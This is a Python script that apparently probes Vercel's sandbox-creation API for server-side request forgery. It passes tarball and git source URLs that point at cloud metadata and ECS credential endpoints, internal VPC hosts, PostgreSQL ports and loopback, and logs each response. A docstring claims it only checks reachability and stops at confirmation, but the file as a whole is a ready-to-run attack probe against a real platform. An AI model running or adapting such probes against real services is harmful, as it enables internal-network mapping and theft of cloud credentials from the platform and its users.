# -*- coding: utf-8 -*-
"""候选10: v4 source 服务端拉取面 — tarball/git URL 服务端请求 (SSRF 候选)
合规: 仅创建失败/成功差异判断可达性, 不读取任何内网凭据 body, stop at confirmation"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

def log(s): print(s, flush=True)

def v4(src, tag):
    api("DELETE", "/v2/sandboxes/srctest?teamId=%s&projectId=%s" % (TEAM, PROJ))
    time.sleep(2)
    body = {"projectId": PROJ, "name": "srctest", "source": src}
    c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, body, 90)
    log('[%s] -> %s | %s' % (tag, c, (r[:300] if r else '').replace(chr(10), ' ')))
    api("DELETE", "/v2/sandboxes/srctest?teamId=%s&projectId=%s" % (TEAM, PROJ))
    time.sleep(2)

log('===== tarball source (服务端 GET) =====')
v4({"type": "tarball", "url": "http://httpbin.org/anything"}, 'tarball-httpbin')
v4({"type": "tarball", "url": "http://169.254.169.254/latest/meta-data/"}, 'tarball-imds')
v4({"type": "tarball", "url": "http://169.254.170.2/credentials"}, 'tarball-ecs')
v4({"type": "tarball", "url": "http://172.31.0.2:5432/"}, 'tarball-pg')
v4({"type": "tarball", "url": "http://172.31.0.2/"}, 'tarball-vpc80')
v4({"type": "tarball", "url": "http://10.0.0.2:5432/"}, 'tarball-10pg')
v4({"type": "tarball", "url": "http://127.0.0.1:23456/"}, 'tarball-lo23456')
v4({"type": "tarball", "url": "http://nonexistent-domain-xyz12345.invalid/x.tar.gz"}, 'tarball-badhost')

log('')
log('===== git source (服务端 clone) =====')
v4({"type": "git", "url": "http://169.254.169.254/latest/meta-data/"}, 'git-imds')
v4({"type": "git", "url": "http://172.31.0.2/"}, 'git-vpc80')
v4({"type": "git", "url": "http://172.31.0.2:5432/"}, 'git-pg')
v4({"type": "git", "url": "http://127.0.0.1:23456/"}, 'git-lo23456')
log('DONE')
